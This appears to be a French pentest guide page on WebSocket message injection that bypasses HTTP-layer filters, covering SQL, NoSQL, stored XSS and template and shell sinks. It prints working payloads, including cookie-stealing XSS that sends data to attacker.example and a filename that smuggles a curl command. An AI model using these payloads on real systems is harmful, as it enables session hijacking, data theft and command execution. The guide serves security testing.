---
order: 3
title: "Injection de message dans les sinks"
description: "Contenu de trame WebSocket affluant sans assainissement vers des sinks SQL, NoSQL, de diffusion XSS stockée, et de commande ou de template, transporté au-delà du filtrage de la couche HTTP."
keywords:
  - injection WebSocket
  - injection de message
  - diffusion XSS stockée
  - injection SQL WebSocket
  - contournement de WAF
---

# Injection de message dans les sinks

Une trame WebSocket n'est qu'une entrée contrôlée par l'attaquant qui se trouve arriver sur un canal persistant. Lorsque le serveur extrait une valeur d'une trame et construit une requête, la rend dans les pages d'autres clients, ou la passe à un shell ou à un moteur de template, chaque injection classique s'applique. Ce qui rend ce canal intéressant à cibler, c'est que la trame contourne généralement les défenses au niveau requête : le WAF, les filtres d'entrée et les middlewares de validation qui inspectent les corps REST ne voient fréquemment jamais les payloads de trame, donc le socket transporte le payload au-delà d'eux intact.

## SQL et NoSQL depuis la trame

Si un champ de trame atterrit dans une chaîne de requête, le socket devient un vecteur d'injection SQL. Une trame de recherche ou de filtre dont le terme est concaténé dans du SQL transporte les payloads habituels :

```json
{"action": "search", "term": "widget' UNION SELECT username, password FROM users-- -"}
```

Le même champ alimentant un document store prend un objet opérateur au lieu d'un scalaire, transformant une recherche en contournement d'authentification ou de filtre :

```json
{"action": "login", "user": "admin", "pass": {"$ne": null}}
```

Comme ces trames ne passent jamais par le routeur REST, les règles basées sur signatures attachées aux endpoints HTTP ne se déclenchent pas sur elles.

## Diffusion XSS stockée vers d'autres clients

Le sink WebSocket à plus fort impact est le tampon de diffusion. Une trame envoyée par un client est stockée puis relayée verbatim à chaque autre client connecté, de sorte qu'un payload de script non assaini s'exécute dans la session de chaque destinataire dès que son client rend le message. C'est du XSS stocké avec livraison en direct, automatique, à tous ceux actuellement connectés :

```json
{"action": "message.send", "room": "support", "body": "<img src=x onerror=\"fetch('https://attacker.example/c?k='+encodeURIComponent(document.cookie))\">"}
```

Chaque client dont l'UI insère `body` comme HTML exécute le payload. Une trame confectionnée pour voler du matériel de session ou pivoter vers des actions privilégiées atteint les opérateurs et d'autres utilisateurs sans aucune interaction supplémentaire, ce qui fait d'une room de support ou de chat partagée une route directe vers la session d'un administrateur.

Les payloads qui évitent les gestionnaires d'événements inline survivent aux clients qui retirent certaines balises :

```json
{"action": "message.send", "room": "support", "body": "<svg><script>new Image().src='https://attacker.example/c?k='+document.cookie</script></svg>"}
```

## Sinks de commande et de template

Les trames atteignent aussi les sinks d'exécution côté serveur. Un champ de trame interpolé dans une chaîne de template rendue ensuite côté serveur donne une server-side template injection :

```json
{"action": "render.preview", "name": "{{7*7}}"}
```

Un `49` dans le résultat confirme l'évaluation ; le payload escalade alors vers le modèle objet du moteur pour atteindre l'exécution de commandes. Lorsqu'une valeur de trame est passée à un shell, par exemple un nom de fichier remis à un worker d'export ou de conversion, les métacaractères du shell enchaînent une commande :

```json
{"action": "export", "filename": "report.pdf; curl https://attacker.example/$(whoami)"}
```

## Pourquoi le canal compte

Le dénominateur commun est le contournement. Les limites de longueur, les filtres de caractères et les règles de WAF sont fréquemment câblés dans le pipeline de requêtes HTTP et ne sont jamais réappliqués aux trames décodées, donc un payload rejeté sur une route REST traverse souvent le socket de la même application. Cartographiez le schéma de trame à partir du trafic propre du client, identifiez quels champs atteignent quel backend, et livrez le payload adapté au sink directement sur le socket.

## Outils

- **Burp Suite** : historique WebSockets et repeater pour éditer les payloads de trame et livrer les injections spécifiques aux sinks.
- **wsrepl** : REPL WebSocket interactif pour le pentest des champs de trame.
- **websocat** : client WebSocket en ligne de commande pour scripter et fuzzer les messages bruts.

## Références

- PortSwigger Web Security Academy, "Manipulating WebSocket messages to exploit vulnerabilities"
- OWASP Web Security Testing Guide, "Testing WebSockets"
